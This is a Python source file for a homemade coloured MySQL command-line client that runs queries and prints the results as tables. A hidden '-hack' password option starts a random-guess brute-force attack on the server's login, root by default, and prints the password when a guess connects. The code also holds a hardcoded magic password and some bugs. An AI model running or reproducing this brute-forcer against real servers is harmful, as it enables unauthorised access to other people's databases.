import mysql.connector as connector
import sys
from time import time
from colorama import init
from termcolor import colored
from random import choice

# pip install auto-py-to-exe

def hack(host,user):
    words= input(' Enter CHARACTERS      : ')
    length=int(input(' Enter password length : '))
    print('\n')
    e='  Total Number of combinations are = '+str(len(words)**length)
    print(colored(e, 'red'))
        
    pass_list=[]
    n=0
    global passwd
    while True:
        pas=''

        for i in range(length):
            c=choice(words)
            pas+=c

        if pas in pass_list:
            pass
        else:
            pass_list.append(pas)
            try:
                conn=connector.connect(host=host,user=user,passwd=pas)
                print('GotIT: The Password is {',pas,'}')                
                passwd=pas                
                break
            except:
                print('.',end='')


init()
host=input(' Enter HOST or IP  : ')
if len(host.strip())== 0:
    host='localhost'
    port = 3306 

elif ":" in host:
    host, port = host.split(":")
    try:
        port = int(port.strip())
    except:
        print("---> invalid port")
        port = 3306 



user=input(' Enter USER name   : ')
if len(user.strip())==0:
    user='root'

passwd=input(' Enter PASSWORD    : ')

if len(passwd.strip())==0:
    raise "Error : Hey! {}, Pease enter PASSWORD to connect to server ".format(user)

if passwd.lower() == 'aditya':
    passwd=''
    
if passwd.lower() == '-hack':
    hack(host,user)


conn=connector.connect(host=host,user=user,passwd=passwd, port = port)

cursor=conn.cursor()

input_text='MySql'#
while True:
    print('\n')
    
    print(colored(input_text+'> ', 'blue'),end='')    
    c=input()
    if c.lower() =='exit' or c.lower() =='exit;':
        sys.exit(1)
        break
    elif c.lower()[:5] =='-name':
        
        input_text=c[6:]
        

    elif len(c.strip()) !=0:
        
        while (c.strip())[-1] != ';':
            print(colored(' '*(len(input_text)-1)+'/> ', 'yellow'),end='')    
            t=input()
            c=c+' '+t

        tb=time()
        if c=='break':
            break
        try:
            cursor.execute(c)
            if c.split(' ')[0] in ['create','alter','insert','drop','update','delete','use']:
                conn.commit()
            if c.split(' ')[0]=='use':
                print(colored('Database changed', 'yellow'))
                
            
            else:
                
                count=0
                
                data=[]
                count_lst=[]
                i=0

                for col in cursor.column_names:
                    try:
                        if   len(str(col)) > count_lst[i]:
                                                    
                            count_lst.pop(i)
                            count_lst.insert(i,len(str(col)))
                        
                    except:
                        count_lst.append(len(str(col)))
                    i+=1
                    
                for row in cursor.fetchall():
                    data.append(row)
                    i=0
                    for col in row:
                        try:
                            if   len(str(col)) > count_lst[i]:
                                                        
                                count_lst.pop(i)
                                count_lst.insert(i,len(str(col)))
                            
                        except:
                            count_lst.append(len(str(col)))
                        i+=1

                if data !=[]:
                    for i in count_lst:
                        p='+'+str('-'*(i+2))
                        print(colored(p, 'red'),end='')
                    print(colored('+', 'red'))

                    c=0
                    for col in cursor.column_names:
                        p=str(col)                    
                        print(colored('| ', 'red'),end='')
                        p=p+(' '*(count_lst[c]-len(p)))+' '                    
                        print(colored(p,'red'),end='')
                        c+=1
                        
                    print(colored('|', 'red'))
         
        
                    for i in count_lst:
                        p='+'+str('-'*(i+2))
                        print(colored(p, 'magenta'),end='')
                    print(colored('+', 'magenta'))
                    
                    count=0
                    for row in data:
                        if count==0:
                            fg='green'
                        elif count==1:
                            fg='blue'
                        elif count==2:
                            fg='white'
                        elif count==3:
                            fg='yellow'
                        else:
                            fg='cyan'
                        
                        count+=1
                        if count==5:
                            count=0

                        
                        c=0
                        for col in row:                        
                            p=str(col)                    
                            print(colored('| ', 'magenta'),end='')
                            p=p+(' '*(count_lst[c]-len(p)))+' '                    
                            print(colored(p,fg),end='')
                            c+=1
                            
                        print(colored('|', 'magenta'))
                        
                    for i in count_lst:
                        p='+'+str('-'*(i+2))
                        print(colored(p, 'magenta'),end='')
                    print(colored('+', 'magenta'))
                    
                    p=' '+str(cursor.rowcount)+' rows in set ('+str(time()-tb)[:4]+' Sec)'
                    print(colored(p, 'cyan'))
                    
                else:
                    print(colored('Query OK,', 'yellow'),end='')
                    p=' '+str(cursor.rowcount)+' row affected ('+str(time()-tb)[:4]+' Sec)'
                    print(colored(p, 'cyan'))

                    
        except Exception as e:
            e='ERROR : '+str(e)+'\n'
            print(colored(e, 'red'))
            

    
    
conn.close()
